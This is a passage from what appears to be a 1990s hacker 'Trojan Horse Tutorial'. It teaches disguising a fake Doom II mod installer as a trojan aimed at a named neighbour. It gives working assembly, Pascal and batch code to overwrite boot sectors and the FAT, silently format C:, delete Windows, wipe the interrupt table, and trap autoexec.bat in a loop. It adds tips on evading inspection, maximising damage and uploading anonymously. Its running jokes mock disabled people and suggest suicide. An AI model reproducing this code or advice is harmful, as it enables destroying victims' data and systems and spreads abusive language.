II. FAQs about Trojan Horses:
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

1q) Will Trojans protect me against STDs?
1a)     Shut up you pervert.

2q) Will Trojan Horses harm my system?
2a)     Trojan horses will carry out whatever evil little scheme the
        author of the code deems fit to set free upon your system.

3q) How can I tell if a file I downloaded from Willy Wonka's Chocolate
     Factory of Phun has a Trojan in it?
3a)     Yes, occasionally.  If you have a program that uses a heuristic
        scanner algorithm, the file you have may be detected as having
        evil code.  If you use an idiotic program that only uses known
        signatures, you're history buddy.

4q) How do I get even with Timmy with the messed up brain down the street?
4a)     Now you have asked a useful question.  Read further for assistance.
        You can send him a trojan horse, send him a virus, stab him, mock
        him at school (call him hydrocephalic.  He'll cry), put itching
        powder in his fishtank, eat him for dinner, or sick Satan on him.

If you are going to send him a trojan horse, this tutorial will be useful
to you.  If you are STILL looking for advice on how to prevent STDs, here
is some:  shoot yourself.  That way you won't be so constantly worried
about them.  (don't forget the disclaimer)

This is by no means an all-inclusive list of the things you can do with
Trojans.  It is meant only as a guide, and the tips are things you should
keep in mind when you are writing your own trojans.  The ideas and code 
listed are just a few things to get your mind headed on the right (wrong?)
track.  Have phun!

III.  Before
-=-=-=-=-=-=-=-

  So, Timmy with the messed up brain has been eating your puppies again,
huh?  Well, here is a good way to get even with him, if he uses a computer.
The more he enjoys using his computer (don't even think of things like that
you disgusting pervert), the more he will be dismayed at the terror you
unleash upon his system.

  Well, to really get even with the "special child," you have to know how
to disguise the trojan well.  Call yer local 3L³T3 WaR3Z BBS, and look and
see what the latest game that everyone is raging about.  It should be pretty
easy to figure out.  They will probably have a sub dedicated to it, because
we all know how W4Y k001 those 3L33t d00dZ R, D0n'Â W3?  Anyway, download
this game and play it, until you figure out what types of things people
might want in it.  I will use Doom ][ as an example.  Now, in Doom ][, if
you edit the 3 million gigabyte .WAD file, you can change the enemies, the
background, levels, etc.  So, you just add the porno spectrum in on it,
because we all know poor little Timmy is a chronic masturbator.  So, what
I would do would be to write a small mod installation program, and say that
it turns the walls into pictures of oversexed slave women from Jupiter.
Then, I would write a cute little installation program with a status bar,
percentages, and all the trimmings.  This would all be tops 15k in Turbo
Pascal or C, but if you are using something lame like Visual Basic, you'll
probably have a good 7 megs on your hands.  Then, while the program is
"modding" the game file (or whatever you choose), you are free to roam
about.

Tips:
-=-=-=-
1. Do not Microwave.
5. Make sure that you make the changes DURING the supposed installation,
     and not after.  It would be blatantly obvious if you had a status
     bar fly across the screen, and then 7 hours of disk writes after
     it says 100%.
5. Make sure that it is believable.  If your final product is good enough
     to fool you, it's good enough to fool the poor little narcoleptic.
5. Doom ][ has a HUGE game file, called doom2.wad (about 15 megs), so
     the installation for this program would take a LOT longer than a
     mod or crack for most other games.  Make sure the length of time the
     "installation" takes is also consistent with the supposed purpose of
     the trojan.
5. Some people are skeptical, and they may view the hex in the program.
     It is wise to peruse a dump of the trojan you write with a hex
     editor, and see if there is any strings or anything that sticks out
     in the code.  The included source for Pascal does not include any
     strings that would make it obvious this program did anything but
     what it was supposed to.
5. Most of all, cater to their tastes.  Just make it look nice and prof-
     essional.  If it is an elite release, most of them come with k3w1
     looking file_id.diz files and countless .NFO files.  I have included
     a sample file_id.diz, and two .nfo files for common BBSs, but by the
     time you get this, these may not be current, so check around.
5. If you plan on writing multiple trojans, CHANGE the appearance of the
     final product, and if you write regular programs in addition to your
     trojans, make SURE they don't resemble the programs you normally
     write, lest someone recognize them as your style.
5. If you use a simple DOS-type deletion for any trojan, a good method
     to insure that the file is gone is to overwrite it, and then delete
     it.  In Pascal, it would be as simple as assigning it to a file
     variable, and rewriting and closing it, to zero it out, and then
     you would delete it.  If you simply delete it, the little industrious
     freak might just undelete all or some of the files, and that is not
     the point of writing trojans.
5. One drawback to writing trojans instead of viruses is that once one
     person uses the program, and finds out his computer is fucked up,
     once he gets access to a term program (if he calls BBSs), he will
     post the fact that the program is a trojan, and all your work
     will be for naught.  A way to get around this is to PHYSICALLY
     damage his computer, which I have not quite figured out how to do yet
     from software.  Overwriting his boot sector will delay him for
     quite some time, and so will overwriting his file allocation table,
     but the second is slightly more easily repairable.  Go for the kill.
     Do as much damage as you can, and delay his informing others about
     your program as long as you possibly can.
5. If you want to actually give the tard a virus, you can simply take
     a popular program and virus it.  There are thousands of virii out
     there, and on my board, as of this day, I have about 1050 of them
     myself.  The number is at the end of the phile.
5. If you are releasing your trojan to a BBS, try and make it as versatile
     as possible.  If you are only giving it to little Timmy, get to know
     him a little bit.  Find out what he is like.  Find out what his direc-
     tory structure is like.  Tailor the trojan to his tastes and his
     computer, and it will be the most effective.  On the other hand, if
     it is to be released, the more versatile it is, the more people will
     be affected.  This just means checking all directories etc, before
     you change to them or delete them, using defaults for commonly used
     programs, etc. etc.
6. If you write a program that makes it so he cannot boot without it running
     a program in his autoexec.bat, and you are friends with Timmy, you
     can go into his setup and change the boot disk order to C:,A:, and
     then it will boot from C first, not allowing him to have a chance to
     use a boot disk.  Of course, you cannot do this for a regular released
     trojan, only for a personal vengeance

Be ruthless.  Timmy deserves it for running afoul of you.


(By the way, if you choose to skip the KoDe SeCTioN, there is a lot of
good ideas and information in the text parts of that section, so go ahead
and read it, and skip the code itself.)

IV. Some Ideas
-=-=-=-=-=-=-=-=-=-

Here are some good ideas to do to poor little Timmy:

a) overwrite his boot sector
b) overwrite his file allocation table
c) allocate all of his RAM to a TSR
d) create files with names like Ñ‘7½¡ˆæY.şb¨ in all of his directories
e) format his disk
f) delete Windows.  He won't know WHAT to do.  "What's DOS?"
g) insert a message in his AUTOEXEC.BAT saying that he is a chronic
     masturbator, and give the location of his stash of Vaseline
h) redefine his interrupts to run YOUR routines or NO routines.
i) make an endless loop in his autoexec.bat
-=-


V. The KoDe SeCTioN
-=-=-=-=-=-=-=-=-=-=-=-

Here is a little code to help you accomplish the tasks I have previously
listed.  At the end of this section, there is the full working pascal
source for an installation program that you can use to your delight.
You can use most of these procedures with that program with a little
modification, or you can write them into your own standalone installer/
cracker/whatever.

-=-
a) overwriting his boot sector:  written in TASM.  You could conceivably
        use DEBUG to do this code, but it would be more complicated.

----------------
        buffer db 512 dup(0)
booty:
        mov al,2                        ;drive number (0=A, 1=B, etc.)
        mov cx,1                        ;number of sectors to write -
                                        ; the boot sector is 1 sector
        mov dx,0                        ;logical sector -
                                        ; the boot sector is sector 0
        lea bx,buffer                   ;overwrite with info in BUFFER
        int 26h                         ;overwrite!!
                                        ;remember that an interrupt 26
                                        ; destroys the flags.  if you
                                        ; want to retain them, you'll
                                        ; have to push them onto the
                                        ; stack.  pushf would be nice.
----------------

-=-
b) overwrite his file allocation table: written in TASM.  It is
        functionally similar to the code for a), with a couple of
        minor changes.

----------------
        buffer db 32767 dup(0)
fatty:
        mov al,2                        ;drive C
        mov cx,64                       ;write 64 sectors
        mov dx,1                        ;sector 1, where the FAT starts
        lea bx,buffer                   ;load the buffer into the prog
        int 26h                         ;overwrite
----------------

-=-
c) allocate all of his RAM to a TSR:  This is in TASM, and it is SO
        easy to do, you can include this in almost any program.
        It is a keep procedure, thus it remains in memory.  Functionally
        useless, but Timmy won't have any memory left until he reboots,
        leaving another vulnerability wide open for you to exploit:
        put this program in his autoexec, and every time he boots, he will
        not even have enough RAM to type something on the command line :)
        While this only allocates very little memory, it will still lower
        the RAM available by 57k, so stick it into a batch file, and have
        it load until it dies.  autoexec.bat

----------------
        mov ah,31h                      ;function number 31
        mov al,0                        ;exit with errorlevel 0 so as
                                        ; not to arouse suspicion
        mov dx,0dfffh                   ; allocate 57k RAM
        int 21h                         ;DOS services
----------------
        If you want to do this in TP, you're in luck.  You can allocate ALL
        of his conventional memory in one blow with the Keep procedure.
        as so:
----------------

program waste;
uses DOS;
{$M 2048,0,655350} { this line allocate all the memory for the heap}
begin
  Keep;            { keeps cs, ds, and heap allocated }
end.
----------------

-=-
d) create files like Ñ‘7½¡ˆæY.şb¨: Pascal procedure.  It will search out
        his directory structure and write files with this type of name.
        You can use a loop to only do a few directories, or just go ahead
        and do all of them.  This does all of them, and it only does one
        directory level off of the root.  To do multiple, you'd have to
        have another loop inside the first.  I'm not going to bother.
        Don't forget, stealth is the key, so make it look and sound
        realistic!
----------------
uses dos;
procedure randname;
var fname:string[12];
    dirinfo : searchrec;
    f : text;
    i : byte;
begin
  chdir('\');
  randomize;
  findfirst('*.*',$10,dirinfo);
  while DOSerror = 0 do
  begin
    chdir(dirinfo.name);
    fname[0] := #0;
    for i := 1 to 12 do
      fname := fname + chr(random(127)+128);
    fname[9] := '.';
    assign(f,fname);
    rewrite(f);
    close(f);
    chdir('\');
    findnext(dirinfo);
  end;
end;
----------------

-=-
e) format his disk: this can be done two ways.  I'm only going to show you
     the easy way to do it, with a batch file and compiler, because the
     other way will take too much time, and it's late.  Maybe in THT02.
     You write the following line into a batch file, and use the included
     compiler to make it not obvious.

----------------
echo y |format c: > nul
----------------

   If you wish to use the other way, before Trojan Horse Tutorial #2 is
   released, you would write it in assembly.  You first use the 'disk
   information' function of int 13h, and find out how many tracks the
   disk has, then you would set up a loop, with the cx register set to
   this amount, and format it one track at a time with the 'format track'
   function of the same interrupt.  Keep in mind, this is a lengthy
   process, so only format one track per percent, or two or whatever.
   And, if you use the included pascal source, make sure you don't use
   the "diskdelay" procedure after the disk has been formatted, else you
   will have a MAJOR runtime error.  Not that you'd care at that point
   anyway, but it's something to keep in mind as you are plotting Timmy's
   untimely demise and punishment for being such an oversexed little loser.

-=-
f) Delete Windows.  If he is like most of the newer computer users, he
        cannot function without his graphical, icon-based interface.
        if you delete Windows, he will surely perish.  This is a simple
        matter, and you can bother programming it, but a quick batch file
        compiled with the included compiler should do the trick nicely
        and easily.

---------------
@echo off
cd\windows
echo y|del *.* > nul
cd system
echo y|del *.* > nul
cd..
rd system
cd temp
echo y|del *.* > nul
cd..
rd temp
cd..
rd windows
---------------

    If you know his directory structure, it would be of infinite advantage,
    because you could tailor this or any of the trojans specifically to
    his system.

-=-
g) write a message in his autoexec.bat:
        this is just another means of using DOS redirection for your evil
        purposes.  Just write this batch file and compile it, and tada.
--------------
@echo off
cd\
attrib autoexec.bat -r -a -s -h
echo echo Mom, I have a confession to make.  I'm a chronic >> autoexec.bat
echo echo masturbator.  I have been using this computer you >> autoexec.bat
echo echo bought me last Christmas to look at pictures of naked>>autoexec.bat
echo echo women.  I have felt guilty about it, and have been >> autoexec.bat
echo echo thinking of a way to tell you.  >> autoexec.bat
attrib autoexec.bat +r
--------------
     Again, knowledge of his habits and his house will go a long way with
       this one.  Say Birthday if he got his computer for his birthday, and
       so on.

-=-
h) Redefine his interrupts.  This is not such a simple matter.  All I can
     do is give you certain advice for this.  Any program I could use to
     show you an example, would not help much in this respect, as this is
     a touchy thing to do, but it can be most effective if you do it prop-
     erly.  I'll use a simple TSR to make his keyboard click when he
     types as an example.  What you would do would be to write your
     routine for making it click, like normal, and then grab hold of the
     interrupt for yourself, and then call the normal interrupt after
     your procedure runs.  The interrupt vector table is at memory
     location 0000:0000h.  This table is 1024 bytes long, and contains
     room for 256 interrupt addresses.  When an interrupt is called, the
     computer checks the address in this table, and then goes to that
     location in memory to service the interrupt.  It is stored LSB..MSB,
     and each address is 4 bytes.  So for interrupt 9, the keyboard int,
     we would go 9x4 bytes into the table, or 36 bytes.  Bytes 36-39
     contain the address, so you save this, and then you replace it
     with the address of your procedure, which you can do directly, or
     by using the seg:ofs functions in pascal, or just using variables
     for the locations in assembly.  Then at the end of your routine,
     make sure you call the old memory location, or whatever interrupt
     you redefine will not be executed.  If this is what you want, you
     can do it very easily in pascal, or almost as easily in assembly.
     here is the pascal code.  Keep in mind, no interrupts you execute
     after this program has run will function, so make this the last
     thing you do in your trojan.  You can write add these into his
     autoexec.bat file, to fuck his computer every time he boots, and
     unless he hits rightshift during boot and has dos 6.xx, he'll be
     screwed until he uses a boot disk.
---------------
program bye;

type vectbl : array[1..1024] of byte;

var kill : vectbl absolute 0:0;

begin
  fillchar(kill,sizeof(kill),0);
end.
---------------
         mov ax,0            ;make the data segment 0000h
         mov ds,ax           ;
         mov bx,0            ;bx=0000h offset of interrupt vector table
         mov cx,1024d        ;1024 bytes
   loop1:
         mov byte ptr[bx],al ;zero out the int vec table
         loop loop1

         mov ah,4ch          ;exit function.  This won't work.
         int 21h             ;You can't do anything now.
---------------

-=-
i) make an endless loop in his autoexec.bat:
        this is SO simple to do, you can do it in almost any way
        imaginable.  By far the easiest and smallest way to do it would
        be to write it as a batch file, and compile that.  I've included
        a batch file compiler in this ZIP, just for you.  Aren't I nice?
        Now shut up.

--------------
      echo :loop >> c:\autoexec.bat
      echo goto loop >> c:\autoexec.bat
--------------

        If you use the RAM allocation thing (idea c), you can stick the
        name of that program in between the two preceding lines, and it
        will call that and loop back to do it again.

        If you are including this in a higher level program, which would
        be more useful, you can use this simple Pascal procedure to do
        the same thing.

--------------
      procedure nukem;
      var f:text;
      begin
        assign(f,'c:\autoexec.bat');
        {$I-}
        reset(f);
        {$I+}
        if ioresult = 0 then append(f) else rewrite(f);
        writeln(f,':loop');
     (* writeln(f,'waste');*) {include this line if you want to}
                              {waste his RAM, and use the proceeding}
                              {pascal program (idea C) to waste his mem}
        writeln(f,'goto loop');
        close(f);
      end;
--------------
        As you can see, this is an easy thing to do for simpletons.  There
        are much more destructive ways to kill the little paraplegic,
        though.  See other suggestions for more info.

VI. Working installation program
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

  Here is the source to a Pascal program for a fake installation screen.
Its alleged purpose is to plaster naked women to the walls of Doom II.
This is fairly extensive, but should provide you with quite a few ideas.
This is working code, and you would distribute this program with files
called 1.gif, 2.gif .. 5.gif (and a lot of 3L33t .nfo fil3z).

        { This is a simple installation trojan.  Right now it doesn't do }
        { anything harmful, but it is the basis for anything you want to }
        { include in it.  If you wish to add code to it, just put your   }
        { code in the 'evil' procedure, and go to it.  Make sure it stays}
        { pretty even, so it looks authentic.  FISH}

VII. Sample files
-=-=-=-=-=-=-=-=-=-

The file_id.diz is a file that is included in ZIPs now that contains a
description of the program.  It usually has IBM line-drawing characters
in it, and has a description of the file as well as a big ugly stupid
looking logo for the group that released the WaRe.  Just make up a lame
group, or steal a DIZ off of some other ware, and masquerade that your
program was distributed or programmed by them, and you have it made.
Include this in the release ZIP, if it is going to a BBS, as well as
one of these two sample .NFO files, or one you got yourself (to be
sneakier), and you've got a regular program.  You can whip up some
quick docs, and/or a readme.1st file, and you are finished and ready to
upload.  It may be prudent not to use your own account for the upload,
especially if you are or become known for trojans, but you can just
feign stupidity if someone gives you flack.
